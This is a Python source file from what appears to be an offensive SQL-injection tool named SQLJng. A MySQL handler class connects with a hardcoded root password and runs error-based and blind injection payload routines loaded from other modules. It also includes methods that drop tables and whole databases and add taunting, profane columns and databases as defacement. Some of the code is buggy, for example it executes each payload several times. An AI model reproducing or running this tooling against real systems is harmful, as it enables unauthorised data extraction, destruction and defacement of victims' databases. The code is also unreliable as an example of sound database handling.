import mysql.connector
from prettytable import PrettyTable
import re
import sys,os

cur = os.getcwd()
sys.path.append(cur)

from INFO.combined import *
from INFO.common import tables
from logger.sqljlog import logger as sqljlog
import warnings
from Exceptions.sqljngwarnings import SQLJNGSelectStatementWarning
from lib.mysqlerrorbased.errorbasedpayload import ErrorBasedPayload
from lib.mysqlblind.blindsqlpayloads import BlindSqlPayloads


class DBMS_mysql:
    def __init__(self, host="localhost", user="root", password="alimirmohammad", database="mysql",tablename="mmd",column="id") -> None:
        self.host = host
        self.user = user
        self.password = password
        self.database = database
        self.connection = mysql.connector.connect(
            host=self.host,
            user=self.user,
            password=self.password,
            database=self.database
        )
        self.cursor = self.connection.cursor()
        self.table = PrettyTable(['Database'])
        self.column_table = PrettyTable(['Field', 'Type', 'Null', 'Key', 'Default', 'Extra'])
        self.tablename = tablename
        self.column = column
    
    def _show_database_columns_info(self):
        self._set_database_name()
        tables = self._show_database_tables_and_store_them()

        for table in tables:
            # Extract table name without single quotes
            table_name = table[0].replace("'", "")
            self.cursor.execute(f"DESCRIBE {table_name}")
            result = self.cursor.fetchall()
            self.column_table.clear_rows()  # Clear existing rows before adding new ones

            # Add column information to the PrettyTable
            for row in result:
                self.column_table.add_row(row)

            # Print or process column information
            print(f"Columns for table {table_name}:")
            print(self.column_table)

    def _set_database_name(self):
        self.cursor.execute(f"USE {self.database}")

    def _show_database_tables_and_store_them(self):
        self.cursor.execute("SHOW TABLES")
        result = self.cursor.fetchall()
        print("Tables in the database:")
        for row in result:
            print(row[0])
        return result
    
    def drop_table(self):
        self.cursor.execute(f"USE {self.database}")
        self.cursor.execute(f"DROP TABLE IF EXISTS {self.tablename}")
    
    def alter_table(self):
        try:
            self.cursor.execute(f"ALTER TABLE {self.tablename}\nADD COLUMN your_security_is_suck_dicks INT; ")
            self.cursor.execute(f"ALTER TABLE {self.tablename}\nADD COLUMN it_would_be_better_to_spend_more")
        
        except mysql.connector.ProgrammingError:
            pass
    
    def show_all_tables(self):
        self.cursor.execute("SHOW TABLES")
        result = self.cursor.fetchall()
        for table in result:
            self.table.add_row(table)

        print(self.table)

    def show_databases(self):
        self.cursor.execute("SHOW DATABASES")
        result = self.cursor.fetchall()
        for database in result:
            self.table.add_row(database)

        print(self.table)
        
    def _describe_table(self):
        self.cursor.execute(f"DESCRIBE {self.tablename}")
        result = self.cursor.fetchall()
        for row in result:
            self.column_table.add_row(row)

        print(self.column_table)
    
    def select_data_from_table(self):
        warnings.warn("Using SELECT command in mysql in not recommended in SQLJNG.",category=SQLJNGSelectStatementWarning)
        self.cursor.execute(f"SELECT * FROM {self.tablename}")
        result = self.cursor.fetchall()
        for row in result:
            self.table.add_column(row)
        
        print(self.table)
    
    def drop_data_base(self):
        self.cursor.execute(f"DROP DATABASE IF EXISTS {self.database}")
    
    def create_database(self):
        self.cursor.execute(f"CREATE DATABASE IF NOT EXISTS Your_security_is_fucked_up_and_suck_dicks")
    
    def show_database_individual(self):
        try:
            self.cursor.execute(f"SHOW TABLE {self.table}")
            result = self.cursor.fetchall()
            for table in result:
                self.table.add_row(table)
            
            print(self.table)
            
        
        except mysql.connector.ProgrammingError as exc:
            errmsg = "The host %s DBMS"%self.host
            errmsg += "does not appear to interact with the current SQLJng mysql commands."
            errmsg += "please check the SQLJng live version from github."
            errmsg += "\ncurrent version: 1.4.4"
            errmsg += f"\n {str(exc)}"

            sqljlog.critical(errmsg)
        
    
    def extract_value_attack(self):
        rows = ErrorBasedPayload.Extractvalue(self.table).split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            try:
                self.cursor.execute(Payloads)
                result = self.cursor.fetchall()
                for row in result:
                    self.table.add_row(row)
                
                print(self.table)
            except mysql.connector.ProgrammingError as exc:
                errmsg = "The host %s DBMS"%self.host
                errmsg += "does not appear to interact with the current SQLJng mysql commands."
                errmsg += "please check the SQLJng live version from github."
                errmsg += "\ncurrent version: 1.4.4"
                errmsg += f"\n {str(exc)}"
                sqljlog.critical(errmsg)
            
            finally:
                try:
                    _ = self.cursor.fetchall()
                    for i in _:
                        self.table.add_row(_)
                    
                    print(self.table)
                
                except:
                    pass
                
                finally:
                    pass
    
    def error_http_req_exploit(self):
        rows = ErrorBasedPayload.http_error_req(self.table).split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            try:
                self.cursor.execute(Payloads)
                result = self.cursor.fetchall()
                for row in result:
                    self.table.add_row(row)
                
                print(self.table)
            except mysql.connector.ProgrammingError as exc:
                errmsg = "The host %s DBMS"%self.host
                errmsg += "does not appear to interact with the current SQLJng mysql commands."
                errmsg += "please check the SQLJng live version from github."
                errmsg += "\ncurrent version: 1.4.4"
                errmsg += f"\n {str(exc)}"
                sqljlog.critical(errmsg)
            
            finally:
                try:
                    _ = self.cursor.fetchall()
                    for i in _:
                        self.table.add_row(_)
                
                except:
                    pass
                
                finally:
                    pass

    def bin_sql_injection(self):
        rows = BlindSqlPayloads.binsqlpayload(column=self.column,table=self.table).split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            try:
                self.cursor.execute(Payloads)
                result = self.cursor.fetchall()
                for row in result:
                    self.table.add_row(row)
                
                print(self.table)
            except mysql.connector.ProgrammingError as exc:
                errmsg = "The host %s DBMS"%self.host
                errmsg += "does not appear to interact with the current SQLJng mysql commands."
                errmsg += "please check the SQLJng live version from github."
                errmsg += "\ncurrent version: 1.4.4"
                errmsg += f"\n {str(exc)}"
                sqljlog.critical(errmsg)
            
            finally:
                pass
    
    def conditional_blind_sql_injection(self):
        rows = BlindSqlPayloads.conditional_blind_sql_injection()
        rows = rows.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            try:
                self.cursor.execute(Payloads)
                result = self.cursor.fetchall()
                for row in result:
                    self.table.add_row(row)
                
                print(self.table)
            except mysql.connector.ProgrammingError as exc:
                errmsg = "The host %s DBMS"%self.host
                errmsg += "does not appear to interact with the current SQLJng mysql commands."
                errmsg += "please check the SQLJng live version from github."
                errmsg += "\ncurrent version: 1.4.4"
                errmsg += f"\n {str(exc)}"
                sqljlog.critical(errmsg)
            
            finally:
                pass
    
    def make_set_sql_injection(self):
        rows = BlindSqlPayloads.make_set_sql_injection().split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            try:
                self.cursor.execute(Payloads)
                result = self.cursor.fetchall()
                for row in result:
                    self.table.add_row(row)
                
                print(self.table)
            except mysql.connector.ProgrammingError as exc:
                errmsg = "The host %s DBMS"%self.host
                errmsg += "does not appear to interact with the current SQLJng mysql commands."
                errmsg += "please check the SQLJng live version from github."
                errmsg += "\ncurrent version: 1.4.4"
                errmsg += f"\n {str(exc)}"
                sqljlog.critical(errmsg)

            
            finally:
                pass
    
    def substring_sql_injection(self):
        rows = BlindSqlPayloads.sub_string_sql_inj(column=self.column).split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            try:
                self.cursor.execute(Payloads)
                result = self.cursor.fetchall() if self.cursor.execute(Payloads) is not None or self.cursor.execute(Payloads) is not "" else os._exit(0) 
                for row in result:
                    self.table.add_row(row)
                
                print(self.table)
            except (mysql.connector.ProgrammingError,mysql.connector.errors.DatabaseError,mysql.connector.InterfaceError) as exc:
                errmsg = "The host %s DBMS"%self.host
                errmsg += "does not appear to interact with the current SQLJng mysql commands."
                errmsg += "please check the SQLJng live version from github."
                errmsg += "\ncurrent version: 1.4.4"
                errmsg += f"\n {str(exc)}"
                sqljlog.critical(errmsg)
            
            finally:
                pass
    
    

# Example usage
db_handler = DBMS_mysql("localhost", "root", "alimirmohammad", "Cars",tablename="mmd")
# db_handler.select_from_table()
db_handler.substring_sql_injection()
        

def Database_handler(hosts):
    pass


